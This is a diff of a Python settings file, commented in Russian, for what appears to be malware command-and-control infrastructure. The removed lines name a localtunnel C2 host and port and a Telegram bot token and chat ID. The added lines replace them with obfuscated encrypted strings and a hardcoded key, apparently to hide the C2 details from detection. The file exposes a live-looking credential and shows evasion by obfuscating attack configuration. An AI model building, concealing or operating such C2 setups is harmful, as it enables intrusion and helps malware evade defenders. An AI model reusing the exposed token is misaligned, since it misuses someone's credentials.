@@ -1,12 +1,10 @@
-# --- Постоянный Адрес Твоей Крепости ---
-# Мы используем постоянный субдомен в localtunnel.
-C2_HOST = "marka-c2-fortress-777.loca.lt"
+# Файл: settings.py (теперь выглядит так)
 
-# --- Настройки для Сервера ---
-# Локальный порт, на котором будет работать твой c2_server.py.
-LOCAL_C2_PORT = 8765
+# Ключ шифрования. Он виден, но без него остальное - мусор.
+ENCRYPTION_KEY = "MneStaloPohuyNaBezopasnost"
 
-# --- Ключи для Telegram Уведомлений ---
-# Твои личные токен и ID чата.
-BOT_TOKEN = "7650238850:AAFFcTP5uesNyAreZbW5_gL36brFObm2e34"
-CHAT_ID = "1640138978"
+# Зашифрованные данные (результат работы encrypt_secrets.py)
+ENC_C2_IP = '\x7f_S}FUBZgAZ@H'
+ENC_C2_HOSTNAME = '.\\H0\x1b\x0f\x18\x1d?\x03E\x05\x18 \x04.HMXGO\x1c\x00\x1d\x16\x1a)\x0b\x17}\x17\x0e\x01'
+ENC_BOT_TOKEN = "zXPcFRTWe_R48\x08'!1*Z\x05\x04\x00 \x162\x06(4\x07\x04A>\x0b#cY\n\x07?\x01\x03/W\x1f\\D"
+ENC_CHAT_ID = '|XQcERTVgW'
